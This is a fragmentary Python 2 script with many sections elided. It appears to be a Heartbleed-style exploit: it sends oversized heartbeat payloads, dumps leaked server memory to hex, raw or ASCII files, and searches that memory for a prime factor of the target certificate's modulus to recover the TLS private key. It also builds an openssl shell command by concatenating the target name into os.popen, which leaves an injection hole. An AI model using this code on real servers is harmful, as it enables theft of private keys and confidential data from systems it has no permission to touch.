...
options.add_option('-l', '--length', type='int', default=0x4000,
                   dest="len", help='payload length to test (default: 0x4000)')
...
options.add_option('-x', '--hexdump', action="store_true",
                   dest="hexdump", help='Enable hex output')

options.add_option('-r', '--rawoutfile', type='str',
                   help='Dump the raw memory contents to a file')

options.add_option('-a', '--asciioutfile', type='str',
                   help='Dump the ascii contents to a file')
...
def hexdump(s):
    ...
    for b in xrange(0, len(s), 16):
        ...
        if opts.hexdump:
            ...
            pdat += ''.join((c if ((32 <= ord(c) <= 126) or (ord(c)
                            == 10) or (ord(c) == 13)) else '.')for c in lin)
    ...
    try:
        ...
        for x in range(0, opts.num):
            ...
            if x == 0 and opts.extractkey:
                ...
                output = os.popen('openssl x509 -in hb-certs/sslcert_' +
                                  targ + '.pem -modulus -noout | cut -d= -f2')
            ...
            if keyfound:
                ...
                sys.stdout.write(
                    '\rPlease wait... connection attempt ' + str(x+1) + ' of ' + str(opts.num))
...
def extractkey(host, chunk, modulus):
    ...
    for offset in xrange(0, len(chunk) - keysize):
        ...
        p = long(''.join(["%02x" % ord(chunk[x]) for x in xrange(
            offset + keysize - 1, offset - 1, -1)]).strip(), 16)
